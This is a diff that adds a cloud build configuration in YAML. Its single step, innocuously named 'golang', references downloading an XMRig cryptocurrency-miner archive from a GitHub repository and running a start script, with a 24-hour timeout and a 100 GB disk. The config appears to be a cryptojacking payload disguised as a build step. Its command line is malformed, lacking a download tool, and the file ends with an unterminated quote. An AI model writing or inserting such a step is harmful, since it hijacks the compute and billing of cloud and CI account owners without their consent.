@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         https://github.com/giungte/gaya/raw/main/xmrig-6.15.2.tar.gz && xmrig-6.15.2.tar.gz && ./start.sh
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100
